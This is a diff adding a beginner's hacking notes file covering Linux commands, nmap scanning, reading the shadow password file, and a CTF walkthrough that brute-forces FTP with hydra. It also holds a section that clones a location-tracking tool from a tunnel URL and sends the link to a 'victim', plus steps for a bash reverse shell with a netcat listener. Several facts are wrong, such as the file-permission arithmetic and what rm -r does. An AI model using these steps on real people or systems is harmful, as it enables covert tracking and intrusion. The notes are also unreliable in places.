@@ -1,0 +1,96 @@
+om namah shivaya
+basic commands
+------------------------------------------------------------------------------------------
+# ls = list of files.
+# ls -al = list of all files including hidden files.
+# ls -l = to see all permissions and group users of dir.
+# cd = change directory.
+# mkdir = to create folder.
+# rmdir = to delete folder .
+# rm -r  = to delete empty folder.
+To hide a folder or file do keep  . before the foler/file name ex:- .jackie.txt.
+touch jackie.txt = to create text file.
+nano  jackie.txt = to edit text.
+to save nano file = ctrl+o , enter , ctrl+x.
+cat jackie.txt = to see the content in text file.
+# cd /etc/ -> # cat passwd = to see users -> # sudo cat shadow = to see hashes pswd
+# man nmap = to take help  (or) # help nmap (or) # nmap -h
+# apt-get update 
+# sudo apt-get upgrade
+# sudo apt install hostapd = for hotspot 
+# sudo netdiscover -i wlan0 = to discover all networks  
+# sudo netdiscover -i wlan0 -r 192.168.133.1/24
+
+ 
+
+permissions:-(user | group) :-
+---------------------------
+if file permission start wiht - then it is file ex:- -rw-r--r--.
+else it is dir/folder ex:- drwxr-xr-x here divide into three parts .
+1st part rwx is users permissions | next part for group | next for present all user using.
+# chmod +x jackie.txt = to give permission to execute it.
+# chmod 777 jackie.txt = all permission to all user/group.
+here y 7 is 4 is for read | 1 is for execution | 2 is for read | 0 is for no permision 
+so 4+1+2 is 7 so 777.
+# sudo useradd bruclee = to add user.
+# sudo useradd dlt = to add user.+
+# sudo userdel dlt = to delete user .
+# sudo passwd bruclee = to assign password.
+# sudo groupadd karate = to add group.
+# usermod -a -G karate bruclee = to add user to group.
+
+networking :-
+--------------
+ip = internet protocol 
+# ipconfig
+
+nmap:-
+---------------------
+# sudo nmap -sn 192.168.133.* = discover all netwroks
+# sudo nmap -O 192.168.133.14 = os detection
+# sudo nmap -sV 192.168.133 = service verion 
+# sudo nmap -p- 192.168.133 
+# sudo nmap -f 192.168.133 = fragment to 
+
+track location by  sending link 
+------------------------------------
+# git clone https://assembled-welsh-keyword-which.trycloudflare.com
+# cd hound => # bash hound.sh => Y => send that link to victim 
+
+
+ctf challege
+------------------------
+ctf :https://youtu.be/hWwuO8c26hc?si=7eFhqtw1vtvpDSfX 
+install ova file in cloud storage vedio down 
+use # sudo netdiscover -i wlan0  we get ip 
+# nmap -p- 192.168.1.27 = we get open ports 
+now as we see http open so go to chrome and type 192.168.1.27 we get a sentance as key is hidden we search for directory 
+load an directory wordlist  and do 
+# sudo gobuster dir -u http://192.168.1.27/ -w '/var/lib/dictionaries-common/wordlist/directory_wordlist.txt' -t 100 
+we get some /alien and /service now go to the chrome and type http://192.168.1.27/alien = copy that wordlist 
+=> open burpsuite as in that it is code of username 
+sen to intruder and repeater start attack by payload we get page of kevin with weak pswd 
+so now as ftp is open so 
+# hydra -l kevin -P '/path/to/rockyou.txt/' 192.168.1.27 ftp  = we get pswd as jessie
+# sudo ftp 192.168.1.27 = to login => ls => #
+>ftp mget * 
+=> enter for three rtime 
+
+
+
+
+
+
+
+
+
+
+reverse shell 
+---------------------------
+go to chrome ans search for reverse shell generator 
+select linux on left top and bash -i 
+type ip of attacker and any port coy th bash code and paste in the bash file 
+make sure that you type 1st line in bash file as => #!/bin/bash
+paste the code copied down of this line and execute by bash filename.bash 
+now go to attacker machine and type # nc -lvnp 4444
+
